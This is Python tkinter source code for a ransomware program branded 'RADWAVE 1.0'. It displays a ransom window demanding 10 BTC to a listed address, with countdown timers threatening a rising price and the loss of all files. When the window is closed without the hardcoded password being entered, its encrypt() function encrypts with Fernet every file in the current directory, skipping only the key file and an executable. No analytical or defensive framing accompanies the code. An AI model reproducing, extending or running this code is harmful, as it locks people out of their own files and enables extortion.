import tkinter as tk
from cryptography.fernet import Fernet
import os


# ── CONFIG (edit these) ────────────────────────────────
PASSWORD = "password"
TIMER1_LABEL = "You will lose all your files in"
TIMER2_LABEL = "Payment price will increase in"
TIMER1_START = 24 * 3600 + 30 * 60 + 32   # 24:30:32
TIMER2_START = 12 * 3600 +  0 * 60 + 55   # 12:00:55
State = False
BG       = "#1a1a2e"
PANEL_BG = "#16213e"
ACCENT   = "#00d4ff"
DIM      = "#555577"
RED      = "#c0392b"
# ──────────────────────────────────────────────────────

root = tk.Tk()
root.title("RADWAVE 1.0")
root.geometry("600x400")
root.configure(bg=BG)
root.resizable(False, False)
root.attributes("-alpha", 0.9)

# Title
tk.Label(root, text="RADWAVE 1.0", font=("TkDefaultFont", 16, "bold"),
         bg=BG, fg=ACCENT).pack(pady=(10, 4))

main = tk.Frame(root, bg=BG)
main.pack(fill=tk.BOTH, expand=True, padx=10, pady=4)


# ── Custom popup ───────────────────────────────────────
def custom_popup(title, text):
    popup = tk.Toplevel(root)
    popup.title(title)
    popup.configure(bg=PANEL_BG)
    popup.geometry("300x150")
    popup.resizable(False, False)

    tk.Label(popup, text=title, bg=PANEL_BG, fg=ACCENT,
             font=("TkDefaultFont", 9, "bold")).pack(pady=10)

    tk.Label(popup, text=text, bg=PANEL_BG, fg="white",
             font=("TkDefaultFont", 12)).pack()

    tk.Button(popup, text="OK", bg=ACCENT, fg="#0f3460",
              font=("TkDefaultFont", 12), command=popup.destroy).pack(pady=15)


# ── Timer helper ───────────────────────────────────────
def make_timer(parent, label, seconds):
    tk.Label(parent, text=label, font=("TkDefaultFont", 4),
             bg=PANEL_BG, fg="#aaaaaa", wraplength=140,
             justify="left").pack(anchor="w", padx=4, pady=(4, 0))
    display = tk.Label(parent, text="", font=("TkFixedFont", 18, "bold"),
                       bg="#0f3460", fg=ACCENT, relief=tk.SUNKEN,
                       padx=6, pady=4, width=9)
    display.pack(padx=8, pady=(2, 8))

    remaining = [seconds]

    def tick():
        t = remaining[0]
        display.config(text=f"{t//3600:02d}:{(t%3600)//60:02d}:{t%60:02d}")
        remaining[0] = t - 1 if t > 0 else seconds
        root.after(1000, tick)

    tick()


# ── Left sidebar ───────────────────────────────────────
sidebar = tk.Frame(main, bg=PANEL_BG, relief=tk.RIDGE, bd=2, width=170)
sidebar.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 8))
sidebar.pack_propagate(False)

make_timer(sidebar, TIMER1_LABEL, TIMER1_START)
make_timer(sidebar, TIMER2_LABEL, TIMER2_START)

# ── Right panel ────────────────────────────────────────
right = tk.Frame(main, bg=PANEL_BG, relief=tk.RIDGE, bd=2)
right.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)

tk.Label(right, text="[ RADWAVE 1.0 ]", font=("TkDefaultFont", 13),
         bg=PANEL_BG, fg=DIM).pack()
tk.Label(right, text="what does it mean?",          font=("TkDefaultFont", 12), bg=PANEL_BG, fg=DIM, justify="left").pack(anchor="w", padx=4, pady=(4, 0))
tk.Label(right, text="All your files have been encrypted",          font=("TkDefaultFont", 12), bg=PANEL_BG, fg=DIM).pack(anchor="w", padx=4, pady=(4, 0))
tk.Label(right, text="and the key to decrypting them",              font=("TkDefaultFont", 12), bg=PANEL_BG, fg=DIM).pack(anchor="w", padx=4, pady=(4, 0))
tk.Label(right, text="is paying a sum of 10BTC to the account below", font=("TkDefaultFont", 12), bg=PANEL_BG, fg=DIM).pack(anchor="w", padx=4, pady=(4, 0))
tk.Label(right, text="Provided you are not able to pay in the next 12hrs", font=("TkDefaultFont", 12), bg=PANEL_BG, fg=DIM).pack(anchor="w", padx=4, pady=(4, 0))
tk.Label(right, text="the price increases by 2",                    font=("TkDefaultFont", 12), bg=PANEL_BG, fg=DIM).pack(anchor="w", padx=4, pady=(4, 0))
tk.Label(right, text="After 24hrs you lose everything",             font=("TkDefaultFont", 12), bg=RED,      fg=DIM).pack(anchor="w", padx=4, pady=(4, 0))
tk.Label(right, text="Axjeuwb6thv4647y5g6h8o8j5484",               font=("TkDefaultFont", 12), bg=PANEL_BG, fg=DIM).pack()


# ── Bottom bar ─────────────────────────────────────────
bottom = tk.Frame(root, bg="#0f3460", pady=8)
bottom.pack(fill=tk.X, padx=10, pady=(0, 10))

pw = tk.Entry(bottom, font=("TkDefaultFont", 11), bg=BG, fg=DIM,
              insertbackground=ACCENT, relief=tk.FLAT, width=30)
pw.insert(0, "")
pw.pack(side=tk.LEFT, padx=(8, 4), ipady=4)


# ── Encrypt / Decrypt ──────────────────────────────────
SKIP = {"radware3.exe", "key.key"}

def encrypt():
    # Guard: don't re-encrypt if key already exists
    if os.path.exists("key.key"):
        return

    files = [f for f in os.listdir() if f not in SKIP and os.path.isfile(f)]
    print(files)

    key = Fernet.generate_key()
    with open("key.key", "wb") as fh:
        fh.write(key)

    f = Fernet(key)
    for file in files:
        with open(file, "rb") as fh:
            contents = fh.read()
        with open(file, "wb") as fh:
            fh.write(f.encrypt(contents))


def decrypt():
    files = [f for f in os.listdir() if f not in SKIP and os.path.isfile(f)]
    print(files)

    try:
        with open("key.key", "rb") as fh:
            secret = fh.read()

        f = Fernet(secret)
        for file in files:
            with open(file, "rb") as fh:
                contents = fh.read()
            with open(file, "wb") as fh:
                fh.write(f.decrypt(contents))

    except FileNotFoundError:
        custom_popup("ERROR", "key.key not found.\nDecryption impossible.")
    except Exception as e:
        custom_popup("ERROR", f"Decryption failed:\n{e}")


# ── Password field focus behaviour ─────────────────────
def pw_focus_in(e):
    if pw.get() == "":
        pw.delete(0, tk.END)
        pw.config(fg=ACCENT, show="*")

def pw_focus_out(e):
    if not pw.get():
        pw.config(show="")
        pw.insert(0, "")
        pw.config(fg=DIM)

pw.bind("<FocusIn>",  pw_focus_in)
pw.bind("<FocusOut>", pw_focus_out)


def clear_password():
    pw.config(show="")
    pw.delete(0, tk.END)
    pw.insert(0, "")
    pw.config(fg=DIM)

def on_login():
    global State
    if pw.get() == PASSWORD:
        decrypt()
        State = True
        custom_popup("DECRYPTION", "Decryption successful.\nAll files have been restored.")
    else:
        custom_popup("ACCESS DENIED", "Incorrect password.\nPlease try again.")


tk.Button(bottom, text="Check Payment", bg=RED,   fg="white",   relief=tk.FLAT,
          padx=10, pady=3, font=("TkDefaultFont", 12),
          command=clear_password).pack(side=tk.LEFT, padx=4)

tk.Button(bottom, text="Decrypt", bg=ACCENT, fg="#0f3460", relief=tk.FLAT,
          padx=10, pady=3, font=("TkDefaultFont", 12),
          command=on_login).pack(side=tk.LEFT, padx=4)


# ── Close triggers encryption ──────────────────────────
def on_close():
    encrypt()
    root.destroy()

def Caser():
    if State ==  True:
       root.destroy()
    else:
       on_close()

root.protocol("WM_DELETE_WINDOW", Caser)
root.mainloop()
